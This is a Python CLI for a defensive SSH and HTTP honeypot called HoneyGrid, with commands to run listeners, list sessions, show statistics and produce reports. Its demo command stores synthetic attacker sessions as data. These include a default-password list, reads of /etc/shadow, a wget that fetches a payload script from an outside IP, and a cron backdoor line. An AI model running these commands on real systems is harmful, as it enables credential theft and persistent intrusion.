"""
HoneyGrid CLI

Commands:
  honeygrid run       -- start SSH + HTTP honeypot listeners
  honeygrid sessions  -- show captured attacker sessions
  honeygrid report    -- generate HTML/PDF attacker intelligence report
  honeygrid stats     -- show aggregated attack statistics
  honeygrid demo      -- inject synthetic demo sessions for testing

Usage:
  honeygrid run --ssh-port 2222 --http-port 8080
  honeygrid run --no-ssh --http-port 80
  honeygrid sessions --last 20
  honeygrid report --output report.html
  honeygrid stats
  honeygrid demo
"""

from __future__ import annotations

import asyncio
import json
import logging
from pathlib import Path
from typing import Optional

import typer
from dotenv import load_dotenv
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

load_dotenv()

app = typer.Typer(
    name="honeygrid",
    help="D-03 SSH + HTTP honeypot with AI attacker profiling.",
    add_completion=False,
)
console = Console()


def _banner() -> None:
    console.print(Panel(
        "[bold red]HoneyGrid[/bold red]  [bright_black]v0.1.0 — SSH + HTTP Honeypot[/bright_black]\n"
        "[bright_black]D-03 — Defensive portfolio project | Captures real attacker TTPs[/bright_black]",
        border_style="bright_black",
        padding=(0, 2),
    ))


def _get_store(log_path: Path):
    from honeygrid.capture.session_store import SessionStore
    return SessionStore(log_path=log_path)


@app.command()
def run(
    ssh_port: int = typer.Option(2222, "--ssh-port", help="SSH honeypot port"),
    http_port: int = typer.Option(8080, "--http-port", help="HTTP honeypot port"),
    host: str = typer.Option("0.0.0.0", "--host", help="Bind address"),
    no_ssh: bool = typer.Option(False, "--no-ssh", help="Disable SSH honeypot"),
    no_http: bool = typer.Option(False, "--no-http", help="Disable HTTP honeypot"),
    log_path: Path = typer.Option(Path("honeygrid_sessions.json"), "--log"),
    verbose: bool = typer.Option(False, "--verbose", "-v"),
) -> None:
    """Start SSH and/or HTTP honeypot listeners."""
    _banner()

    level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
        datefmt="%H:%M:%S",
    )

    from honeygrid.core.orchestrator import HoneyGridConfig, run as _run

    config = HoneyGridConfig(
        ssh_host=host,
        ssh_port=ssh_port,
        http_host=host,
        http_port=http_port,
        enable_ssh=not no_ssh,
        enable_http=not no_http,
        log_path=str(log_path),
        verbose=verbose,
    )

    console.print(f"[cyan]Starting honeypots...[/cyan]")
    if not no_ssh:
        console.print(f"  [green]SSH:[/green]  {host}:{ssh_port}")
    if not no_http:
        console.print(f"  [green]HTTP:[/green] {host}:{http_port}")
    console.print(f"  [green]Log:[/green]  {log_path}\n")
    console.print("[dim]Press Ctrl+C to stop.[/dim]\n")

    try:
        asyncio.run(_run(config))
    except KeyboardInterrupt:
        console.print("\n[yellow]HoneyGrid stopped.[/yellow]")


@app.command()
def sessions(
    log_path: Path = typer.Option(Path("honeygrid_sessions.json"), "--log"),
    last: int = typer.Option(20, "--last", "-n", help="Show last N sessions"),
    protocol: Optional[str] = typer.Option(None, "--protocol", "-p", help="Filter: ssh|http"),
    min_threat: str = typer.Option("low", "--min-threat", help="Min threat level"),
) -> None:
    """Show captured attacker sessions."""
    _banner()

    if not log_path.exists():
        console.print("[yellow]No session log found. Run 'honeygrid run' first.[/yellow]")
        raise typer.Exit(0)

    try:
        raw: dict = json.loads(log_path.read_text(encoding="utf-8"))
    except Exception as exc:
        console.print(f"[red]Failed to read log: {exc}[/red]")
        raise typer.Exit(1)

    threat_order = ["critical", "high", "medium", "low", "info"]
    min_idx = threat_order.index(min_threat) if min_threat in threat_order else 3

    all_sessions = list(raw.values())
    filtered = [
        s for s in all_sessions
        if (not protocol or s.get("protocol") == protocol)
        and threat_order.index(s.get("threat_level", "low")) <= min_idx
    ]
    filtered.sort(key=lambda s: s.get("started_at", ""), reverse=True)
    shown = filtered[:last]

    if not shown:
        console.print("[yellow]No sessions match filters.[/yellow]")
        return

    table = Table(
        title=f"Attacker Sessions — {len(shown)} shown / {len(all_sessions)} total",
        show_header=True, header_style="bold",
    )
    table.add_column("ID", width=12)
    table.add_column("Proto", width=6)
    table.add_column("Source IP", width=18)
    table.add_column("Threat", width=9)
    table.add_column("Auth", width=6, justify="right")
    table.add_column("Cmds", width=6, justify="right")
    table.add_column("Reqs", width=6, justify="right")
    table.add_column("Duration", width=8)
    table.add_column("Country", width=8)
    table.add_column("Tags")

    for s in shown:
        threat = s.get("threat_level", "low")
        colors = {"critical": "red", "high": "dark_orange", "medium": "yellow",
                  "low": "cyan", "info": "bright_black"}
        c = colors.get(threat, "white")
        tags = ", ".join(s.get("tags", [])[:3])
        dur = f"{float(s.get('duration_seconds', 0)):.0f}s"

        table.add_row(
            s.get("id", "?")[:12],
            s.get("protocol", "?").upper(),
            s.get("source_ip", "?"),
            f"[{c}]{threat.upper()}[/{c}]",
            str(len(s.get("auth_attempts", []))),
            str(len(s.get("commands", []))),
            str(len(s.get("http_requests", []))),
            dur,
            s.get("country") or "-",
            tags[:30],
        )

    console.print(table)


@app.command()
def stats(
    log_path: Path = typer.Option(Path("honeygrid_sessions.json"), "--log"),
) -> None:
    """Show aggregated attack statistics."""
    _banner()

    if not log_path.exists():
        console.print("[yellow]No session log found.[/yellow]")
        raise typer.Exit(0)

    raw: dict = json.loads(log_path.read_text(encoding="utf-8"))
    all_s = list(raw.values())

    from collections import Counter
    username_c: Counter = Counter()
    password_c: Counter = Counter()
    cmd_c: Counter = Counter()
    path_c: Counter = Counter()
    ip_c: Counter = Counter()
    threat_c: Counter = Counter()

    for s in all_s:
        ip_c[s.get("source_ip", "?")] += 1
        threat_c[s.get("threat_level", "low")] += 1
        for a in s.get("auth_attempts", []):
            if a.get("username"):
                username_c[a["username"]] += 1
            if a.get("password"):
                password_c[a["password"]] += 1
        for c in s.get("commands", []):
            if c.get("command"):
                cmd_c[c["command"].split()[0]] += 1
        for r in s.get("http_requests", []):
            if r.get("path"):
                path_c[r["path"]] += 1

    console.print(f"\n[bold]Total sessions:[/bold] {len(all_s)}")
    console.print(f"[red]Critical:[/red] {threat_c['critical']}  "
                  f"[dark_orange]High:[/dark_orange] {threat_c['high']}  "
                  f"[yellow]Medium:[/yellow] {threat_c['medium']}")

    def _print_top(title: str, counter: Counter, n: int = 8) -> None:
        if not counter:
            return
        t = Table(title=title, show_header=True, header_style="bold", min_width=40)
        t.add_column("Value", width=30)
        t.add_column("Count", width=8, justify="right")
        for val, cnt in counter.most_common(n):
            t.add_row(str(val)[:30], str(cnt))
        console.print(t)

    _print_top("Top Usernames", username_c)
    _print_top("Top Passwords", password_c)
    _print_top("Top SSH Commands", cmd_c)
    _print_top("Top HTTP Paths", path_c)
    _print_top("Top Attacker IPs", ip_c)


@app.command()
def report(
    log_path: Path = typer.Option(Path("honeygrid_sessions.json"), "--log"),
    output: Path = typer.Option(Path("honeygrid-report.html"), "--output", "-o"),
    fmt: str = typer.Option("html", "--format", "-f"),
    no_ai: bool = typer.Option(False, "--no-ai"),
) -> None:
    """Generate HTML/PDF attacker intelligence report."""
    _banner()

    if not log_path.exists():
        console.print("[yellow]No session log found. Run 'honeygrid run' first.[/yellow]")
        raise typer.Exit(0)

    raw: dict = json.loads(log_path.read_text(encoding="utf-8"))

    # Reconstruct minimal AttackerSession objects for report
    from honeygrid.types.events import (
        AttackerSession, AuthAttempt, CommandEntry, HttpRequest,
        Protocol, SessionStatus, ThreatLevel, HoneypotStats,
    )
    from collections import Counter
    from datetime import datetime, timezone

    sessions: list[AttackerSession] = []
    for s_dict in raw.values():
        proto_str = s_dict.get("protocol", "ssh")
        proto = Protocol.SSH if proto_str == "ssh" else Protocol.HTTP
        threat_str = s_dict.get("threat_level", "low")
        threat = ThreatLevel(threat_str) if threat_str in ThreatLevel._value2member_map_ else ThreatLevel.LOW

        s = AttackerSession(
            id=s_dict.get("id", "?"),
            protocol=proto,
            source_ip=s_dict.get("source_ip", "?"),
            threat_level=threat,
            country=s_dict.get("country"),
            ai_profile=s_dict.get("ai_profile"),
            tags=s_dict.get("tags", []),
            mitre_techniques=s_dict.get("mitre_techniques", []),
        )
        try:
            s.started_at = datetime.fromisoformat(s_dict.get("started_at", ""))
        except Exception:
            pass
        s.auth_attempts = [
            AuthAttempt(username=a.get("username", ""), password=a.get("password", ""),
                        success=a.get("success", False))
            for a in s_dict.get("auth_attempts", [])
        ]
        s.commands = [CommandEntry(command=c.get("command", "")) for c in s_dict.get("commands", [])]
        s.http_requests = [HttpRequest(method=r.get("method", "GET"), path=r.get("path", "/"),
                                       user_agent=r.get("ua", ""))
                           for r in s_dict.get("http_requests", [])]
        sessions.append(s)

    # Build stats
    stats_obj = HoneypotStats()
    stats_obj.total_sessions = len(sessions)
    stats_obj.ssh_sessions = sum(1 for s in sessions if s.protocol == Protocol.SSH)
    stats_obj.http_sessions = sum(1 for s in sessions if s.protocol == Protocol.HTTP)
    stats_obj.unique_ips = len({s.source_ip for s in sessions})
    stats_obj.total_auth_attempts = sum(len(s.auth_attempts) for s in sessions)
    stats_obj.total_commands = sum(len(s.commands) for s in sessions)
    stats_obj.total_http_requests = sum(len(s.http_requests) for s in sessions)
    stats_obj.critical_count = sum(1 for s in sessions if s.threat_level == ThreatLevel.CRITICAL)
    stats_obj.high_count = sum(1 for s in sessions if s.threat_level == ThreatLevel.HIGH)
    stats_obj.medium_count = sum(1 for s in sessions if s.threat_level == ThreatLevel.MEDIUM)

    un_c: Counter = Counter()
    pw_c: Counter = Counter()
    cmd_c: Counter = Counter()
    path_c: Counter = Counter()
    ip_c: Counter = Counter()
    for s in sessions:
        ip_c[s.source_ip] += 1
        for a in s.auth_attempts:
            if a.username: un_c[a.username] += 1
            if a.password: pw_c[a.password] += 1
        for c in s.commands:
            if c.command: cmd_c[c.command.split()[0]] += 1
        for r in s.http_requests:
            path_c[r.path] += 1
    stats_obj.top_usernames = un_c.most_common(10)
    stats_obj.top_passwords = pw_c.most_common(10)
    stats_obj.top_commands = cmd_c.most_common(10)
    stats_obj.top_paths = path_c.most_common(10)
    stats_obj.top_ips = ip_c.most_common(10)

    if not no_ai:
        console.print("[purple]Running AI profiler on top sessions...[/purple]")
        from honeygrid.core.ai_profiler import profile_all
        asyncio.run(profile_all(sessions))

    from honeygrid.report.generator import generate_html, generate_pdf

    if fmt == "pdf":
        out = generate_pdf(sessions, stats_obj, output.with_suffix(".pdf"))
    else:
        out = generate_html(sessions, stats_obj, output.with_suffix(".html"))

    console.print(f"\n[green]Report saved -> {out}[/green]")


@app.command()
def demo(
    log_path: Path = typer.Option(Path("honeygrid_demo.json"), "--log"),
) -> None:
    """Inject synthetic attacker sessions for demo/testing."""
    _banner()
    from honeygrid.types.events import (
        AttackerSession, AuthAttempt, CommandEntry, HttpRequest,
        Protocol, ThreatLevel,
    )
    from datetime import datetime, timezone, timedelta

    store_path = log_path
    sessions_data = {}

    base = datetime(2024, 6, 15, 2, 0, 0, tzinfo=timezone.utc)

    # Session 1: SSH brute force + lateral movement attacker
    s1 = AttackerSession(
        protocol=Protocol.SSH, source_ip="185.220.101.42", source_port=55000,
        started_at=base, threat_level=ThreatLevel.CRITICAL, country="DE",
        tags=["brute_force", "download_attempt", "credential_harvesting", "persistence_attempt"],
        mitre_techniques=["T1110.001", "T1105", "T1003.008", "T1053.003"],
        ai_profile="Sophisticated attacker performing systematic credential stuffing followed by persistence installation. Consistent with automated botnet tooling (Mirai variant). Immediately harvested /etc/shadow and attempted to install cron-based backdoor.",
    )
    for user, pwd in [("root","root"),("admin","admin"),("root","123456"),("admin","password"),
                      ("deploy","deploy123"),("ubuntu","ubuntu"),("root","toor"),
                      ("admin","admin123"),("root","P@ssw0rd"),("deploy","changeme")]:
        s1.auth_attempts.append(AuthAttempt(username=user, password=pwd, success=user=="deploy" and pwd=="deploy123"))
    for cmd in ["id", "whoami", "uname -a", "cat /etc/passwd", "cat /etc/shadow",
                "ps aux", "netstat -tulpn", "wget http://185.100.87.12/payload.sh",
                "chmod +x payload.sh", "crontab -l", "echo '* * * * * /tmp/.x' | crontab -"]:
        s1.commands.append(CommandEntry(command=cmd))
    sessions_data[s1.id] = s1.to_dict()

    # Session 2: HTTP scanner
    s2 = AttackerSession(
        protocol=Protocol.HTTP, source_ip="45.83.64.1", source_port=0,
        started_at=base + timedelta(minutes=5), threat_level=ThreatLevel.HIGH, country="RU",
        tags=["scanner", "credential_harvesting"],
        mitre_techniques=["T1595.002", "T1078"],
    )
    for path, method in [("/",  "GET"), ("/wp-login.php", "GET"), ("/wp-admin/", "GET"),
                         ("/admin", "GET"), ("/.env", "GET"), ("/.git/config", "GET"),
                         ("/phpmyadmin", "GET"), ("/login", "POST"), ("/wp-login.php", "POST")]:
        s2.http_requests.append(HttpRequest(method=method, path=path,
                                             user_agent="Mozilla/5.0 zgrab/0.x",
                                             body="username=admin&password=password" if method == "POST" else ""))
    sessions_data[s2.id] = s2.to_dict()

    # Session 3: Lightweight SSH recon
    s3 = AttackerSession(
        protocol=Protocol.SSH, source_ip="91.92.251.103", source_port=43211,
        started_at=base + timedelta(minutes=12), threat_level=ThreatLevel.MEDIUM, country="NL",
        tags=["os_fingerprinting", "network_recon"],
        mitre_techniques=["T1082", "T1049"],
    )
    s3.auth_attempts.append(AuthAttempt(username="root", password="root", success=True))
    for cmd in ["uname -a", "id", "hostname", "ifconfig", "netstat -tulpn"]:
        s3.commands.append(CommandEntry(command=cmd))
    sessions_data[s3.id] = s3.to_dict()

    store_path.write_text(json.dumps(sessions_data, indent=2, default=str), encoding="utf-8")
    console.print(f"[green]Demo sessions written to {store_path}[/green]")
    console.print(f"[dim]Run: honeygrid sessions --log {store_path}[/dim]")
    console.print(f"[dim]Run: honeygrid report --log {store_path} --no-ai -o demo-report.html[/dim]")


if __name__ == "__main__":
    app()
